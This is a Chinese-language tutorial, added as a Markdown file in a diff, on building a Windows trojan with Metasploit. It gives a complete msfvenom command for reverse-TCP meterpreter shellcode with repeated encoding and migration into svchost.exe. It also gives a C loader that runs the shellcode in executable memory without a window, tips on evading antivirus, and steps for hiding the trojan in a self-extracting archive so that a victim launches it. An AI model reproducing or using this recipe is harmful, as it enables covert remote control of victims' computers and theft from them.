@@ -1,0 +1,61 @@
+# MSF框架渗透Windows，使用ShellCord.c植入木马
+
+一如既往地，我们打开MSF
+
+使用命令`show payloads`查看所有攻击载荷
+
+我们看到`windows/meterpreter/reverse_tcp`
+
+之后我们在另一终端里使用`msfvenom`命令来生成木马
+
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=内网IP或者穿透后的Frp或Ngrok的IP LPORT=内网本机空闲端口号或者你转发出去的端口号 -e x86/shikata_ga_nai -i 15 -b '\x00\' PrependMigrate=true PrependMigrateProc=svchost.exe -f c > shellcode.c`
+
+-e x86/shikata_ga_nai -i 15是用-e x86/shikata_ga_nai编码15次，而PrependMigrate=true PrependMigrateProc=svchost.exe使这个程序默认会迁移到svchost.exe进程，自己测试的时候不建议到这个进程而是其他的持久进程，这样别人打开之后就无法再常规的去关闭回连的会话。你还可以使用windows/meterpreter/reverse_tcp_rc4这个payload,对会话进行加密，增加免杀能力。
+相信大家都试过，直接输出exe文件就算注入其他软件和进行编码n遍也会马上被查杀出来。多次测试发现用x86/shikata_ga_na编码超过12次以上再通过shellcode编译出来都能免杀。
+
+这里使用的是win32项目，至于为什么是32，可以去了解360等运行机制，这里不过多阐述。
+
+如下图，你的目录下会多出一个名为shellcode的.c文件（C语言）
+
+![1](1.png)
+
+![2](2.png)
+
+之后我们将这个文件拷贝到u盘也好，什么也好，我们需要将它放到一台可以编译C语言的机器上进行exe编译打包，这里我使用Visual Studio2017（2013等直接写明为win32程序，但是2017版稍微有点出入），当然你也可以选择其他编译器，前提是能将其编译出来为exe
+
+![3](3.png)
+
+下面是一个编译用的模板
+
+```
+#include<stdio.h>
+#include<windows.h>
+#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")     //去除窗口
+unsigned char shellcode[]= 这里就是shellcode
+void main()
+{
+ LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+ memcpy(Memory, shellcode, sizeof(shellcode));
+ ((void(*)())Memory)();
+}
+
+```
+我们这样填
+
+![4](4.png)
+
+之后我们点击调试/F5，开始编译，我们会发现没有任何报错，但被Windows防火墙秒杀
+
+没问题，之后我们点击生成->生成解决方案
+
+![5](5.png)
+
+![6](6.png)
+
+我们选择Release x86之后，选择生成->重新生成解决方案，我们看到下面已经成功生成exe并返回文件生成所在目录
+
+![7](7.png)
+
+之后我们找一个正常的或者其他文件，将几个选择起来，右键->添加到压缩..之后我们可以看到压缩成exe文件，我们选择exe解压自运行！当受害者打开exe时，就会自解压文件与启动木马。
+
+MSF监听上线的方式这里就不多做阐述了
